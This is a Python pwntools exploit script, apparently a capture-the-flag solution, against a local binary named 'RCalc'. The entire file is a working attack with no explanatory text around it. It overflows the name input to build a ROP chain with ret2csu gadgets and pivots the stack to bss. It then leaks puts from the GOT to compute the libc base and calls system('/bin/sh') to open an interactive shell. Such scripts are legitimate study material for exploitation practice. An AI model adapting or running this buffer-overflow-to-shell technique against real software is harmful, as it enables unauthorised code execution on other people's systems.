#!/usr/bin/env python
from pwn import *

context(os='linux', arch='amd64')
context.log_level = 'debug' # output verbose log
context.terminal = ['terminator', '-x', 'bash', '-c']

libc = ELF('./libc.so.6')
elf = ELF('./RCalc')

def section_addr(name, elf=elf):
    return elf.get_section_by_name(name).header['sh_addr']


conn = process(['./RCalc'], env={'LD_PRELOAD': './libc.so.6'})

# preparing for exploitation

puts_got = elf.got['puts']
read_got = elf.got['read']
puts_offset = libc.symbols['puts']
system_offset = libc.symbols['system']
binsh_offset = next(libc.search('/bin/sh'))

leave_ret = 0x00401034  #: leave  ; ret  ;  (1 found)
csu_init1 = 0x401100    # mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call qword [r12+rbx*8] ;  (1 found)
csu_init2 = 0x40111a    # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret  ;  (1 found)
pop_rdi = 0x00401123    #: pop rdi ; ret  ;  (1 found)
bss = 0x602200

def Add(int1, int2, flag):
    conn.sendlineafter('Your choice:', '1')
    conn.sendlineafter('input 2 integer: ', str(int1))
    conn.sendline(str(int2))
    
    if flag:
        conn.sendlineafter('Save the result? ', 'yes')
    else:
        conn.sendlineafter('Save the result? ', 'no')


log.info('Pwning')
gdb.attach(conn)
name = 'A' * 0x108
name += p64(0x2)
name += "X" * 8

# read(stdin, bss, 0x100) and stack pivot
rop = ''
rop += p64(csu_init2)
rop += p64(0x070400)                # rbx
rop += p64(0x070400+1)              # rbp
rop += p64(0x280050)                # r12
rop += p64(0x100)                   # r13
rop += p64(bss)
rop += p64(0x0)
rop += p64(csu_init1)
rop += "Z" * 8
rop += "Z" * 8
rop += p64(bss - 8)
rop += "Z" * (8 * 4)
rop += p64(leave_ret)

payload = name + rop
conn.sendlineafter('Input your name pls: ', payload)

for i in range(0x20 + 2):
    Add(i, i, True)

Add(1, 1, True)
conn.sendlineafter('Your choice:', '5'.ljust(0xf, '\x00'))

# puts(puts_got)
rop = ''
rop += p64(csu_init2)
rop += p64(0x0)                    # rbx
rop += p64(0x1)                    # rbp
rop += p64(puts_got)                # r12
rop += p64(0xdeadbeaf)             # r13
rop += p64(0xdeadbeaf)
rop += p64(puts_got)
rop += p64(csu_init1)
rop += "Z" * 8
# read(stdin, bss+a, 0x100) and stack pivot
rop += p64(0x0)                    # rbx
rop += p64(0x1)                    # rbp
rop += p64(read_got)                # r12
rop += p64(0x100)             # r13
rop += p64(bss+0x100)
rop += p64(0)
rop += p64(csu_init1)
rop += "Z" * 8
rop += "Z" * 8
rop += p64(bss - 8 + 0x100)
rop += "Z" * (8 * 4)
rop += p64(leave_ret)
conn.sendline(rop)

libc_base = u64(conn.recv(6).ljust(8, '\x00')) - puts_offset
log.info('libc_base = {:#x}'.format(libc_base))

rop = ''
rop += p64(pop_rdi)
rop += p64(libc_base + binsh_offset)
rop += p64(libc_base + system_offset)
conn.sendline(rop)

conn.interactive()